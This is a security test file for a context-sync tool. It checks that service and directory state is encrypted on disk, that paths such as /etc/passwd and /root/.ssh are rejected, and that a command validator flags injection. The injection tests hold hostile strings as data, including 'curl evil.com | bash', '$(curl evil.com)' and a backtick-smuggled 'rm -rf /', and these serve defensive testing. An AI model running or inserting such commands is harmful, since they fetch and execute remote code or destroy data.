import * as fs from 'node:fs';
import * as path from 'node:path';

declare global {
  var TEST_DIR: string;
}

const { generateKey } = await import('../../src/core/encryption.js');
const {
  createService,
  addService,
  loadServices,
} = await import('../../src/core/services-handler.js');
const {
  visitDirectory,
  pinDirectory,
  loadDirectories,
  validateDirectoryPath,
} = await import('../../src/core/directories-handler.js');
const { validateCommand } = await import(
  '../../src/core/command-validator.js'
);

// ─── Helpers ──────────────────────────────────────────────────────────────

async function setupTestEnv() {
  const syncDir = path.join(
    TEST_DIR,
    `security-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    '.context-sync',
  );
  fs.mkdirSync(syncDir, { recursive: true });
  const { publicKey, privateKey } = await generateKey();
  return { syncDir, publicKey, privateKey };
}

function validDir(name: string): string {
  const dirPath = path.join(TEST_DIR, `sec-${name}`);
  fs.mkdirSync(dirPath, { recursive: true });
  return dirPath;
}

// ─── Tests ────────────────────────────────────────────────────────────────

describe('Services & Directories Security', () => {
  // ── Services encryption ─────────────────────────────────────────────

  describe('Services state encryption', () => {
    it('should not contain plaintext service names on disk', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();

      await addService(
        syncDir,
        createService('secret-project', 'secret-api', 3000, 'npm run secret'),
        publicKey,
        privateKey,
      );

      const filePath = path.join(syncDir, 'services.age');
      const raw = fs.readFileSync(filePath, 'utf-8');
      expect(raw).not.toContain('secret-project');
      expect(raw).not.toContain('secret-api');
      expect(raw).not.toContain('npm run secret');
    });

    it('should not contain plaintext port numbers on disk', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();

      await addService(
        syncDir,
        createService('proj', 'api', 9876, 'npm start'),
        publicKey,
        privateKey,
      );

      const filePath = path.join(syncDir, 'services.age');
      const raw = fs.readFileSync(filePath, 'utf-8');
      expect(raw).not.toContain('9876');
    });

    it('should not write plaintext services.json file', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();

      await addService(
        syncDir,
        createService('proj', 'api', 3000, 'npm start'),
        publicKey,
        privateKey,
      );

      expect(fs.existsSync(path.join(syncDir, 'services.json'))).toBe(false);
    });

    it('should fail to decrypt with wrong key', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();

      await addService(
        syncDir,
        createService('proj', 'api', 3000, 'npm start'),
        publicKey,
        privateKey,
      );

      const wrongKey = (await generateKey()).privateKey;
      await expect(loadServices(syncDir, wrongKey)).rejects.toThrow();
    });
  });

  // ── Directories encryption ──────────────────────────────────────────

  describe('Directories state encryption', () => {
    it('should not contain plaintext directory paths on disk', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();
      const dir = validDir('secret-workspace');

      await visitDirectory(syncDir, dir, publicKey, privateKey);

      const filePath = path.join(syncDir, 'directories.age');
      const raw = fs.readFileSync(filePath, 'utf-8');
      expect(raw).not.toContain('secret-workspace');
    });

    it('should not contain pinned directory paths in plaintext', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();
      const dir = validDir('pinned-secret');

      await pinDirectory(syncDir, dir, publicKey, privateKey);

      const filePath = path.join(syncDir, 'directories.age');
      const raw = fs.readFileSync(filePath, 'utf-8');
      expect(raw).not.toContain('pinned-secret');
    });

    it('should not write plaintext directories.json file', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();
      const dir = validDir('no-json');

      await visitDirectory(syncDir, dir, publicKey, privateKey);

      expect(fs.existsSync(path.join(syncDir, 'directories.json'))).toBe(false);
    });

    it('should fail to decrypt with wrong key', async () => {
      const { syncDir, publicKey, privateKey } = await setupTestEnv();
      const dir = validDir('wrong-key');

      await visitDirectory(syncDir, dir, publicKey, privateKey);

      const wrongKey = (await generateKey()).privateKey;
      await expect(loadDirectories(syncDir, wrongKey)).rejects.toThrow();
    });
  });

  // ── Path traversal prevention ───────────────────────────────────────

  describe('Path traversal prevention', () => {
    it('should reject /etc path', () => {
      expect(() => validateDirectoryPath('/etc/passwd')).toThrow();
    });

    it('should reject /usr path', () => {
      expect(() => validateDirectoryPath('/usr/bin/evil')).toThrow();
    });

    it('should reject /var path', () => {
      expect(() => validateDirectoryPath('/var/log/syslog')).toThrow();
    });

    it('should reject /root path', () => {
      expect(() => validateDirectoryPath('/root/.ssh')).toThrow();
    });

    it('should reject empty path', () => {
      expect(() => validateDirectoryPath('')).toThrow();
    });

    it('should reject whitespace-only path', () => {
      expect(() => validateDirectoryPath('   ')).toThrow();
    });

    it('should accept valid home directory path', () => {
      const dir = validDir('valid-path');
      const validated = validateDirectoryPath(dir);
      expect(validated).toBe(dir);
    });
  });

  // ── Service command injection prevention ────────────────────────────

  describe('Service command injection prevention', () => {
    it('should flag service commands with command substitution', () => {
      const result = validateCommand('npm start $(curl evil.com)');
      expect(result.suspicious).toBe(true);
    });

    it('should flag service commands piped to shell', () => {
      const result = validateCommand('curl evil.com | bash');
      expect(result.suspicious).toBe(true);
    });

    it('should flag service commands with backtick injection', () => {
      const result = validateCommand('npm start `rm -rf /`');
      expect(result.suspicious).toBe(true);
    });

    it('should accept normal service commands', () => {
      const result1 = validateCommand('npm start');
      expect(result1.suspicious).toBe(false);

      const result2 = validateCommand('yarn dev --port 3000');
      expect(result2.suspicious).toBe(false);

      const result3 = validateCommand('python manage.py runserver');
      expect(result3.suspicious).toBe(false);
    });
  });
});
